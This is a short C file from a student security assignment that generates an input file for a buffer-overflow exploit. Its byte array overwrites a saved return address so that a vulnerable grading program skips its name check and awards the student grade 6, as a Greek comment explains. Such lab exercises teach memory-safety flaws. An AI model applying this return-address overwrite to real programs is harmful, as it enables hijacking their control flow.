/*Giorgos Xatzipantelis
  AM:2489
  File:createdata6.c 
  Assignment6      */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#define ARRAYSIZE 50


int array[ARRAYSIZE]=
{
   'G','i','o','r','g','o','s',' ','X','a','t','z','i','p','a',
'n','t','e','l','i','s','\0',' ',' ',' ',' ',' ',' ',' ',' ',0x1e, 0x00, 0x00, 
0x00,
0xff, 0xff, 0xff, 0xff, 0x28, 0xf9, 0xff, 0x6f, 0xcf, 0x82, 0x04, 0x08, 0xd8,
0x1b, 0x0b, 0x08
};
/*Ta parapanw stoixeia ston array kanoun overwrite mexri kai
 *4 bytes meta thn Return Address, oti grafei prin kai meta thn RA
 *einai oti periexei kanonika to stack frame otan vazw kanonika
 *to onoma mou, alla h RA ginetai overwite me thn diethinsh akrivws
 * meta ton elegho tou onomatos sthn main. Etsi epistrefei ekei meta
 *thn readStirng kai bazei to diko mou onoma na pairnei ton vathmo 6.
 */
int main(void) {
        int cnt;
        FILE *fp;
        fp=fopen("data6","w");
        for(cnt=0; cnt<ARRAYSIZE; cnt++)
                fputc(array[cnt],fp);
        fclose(fp);
    return 0;
}
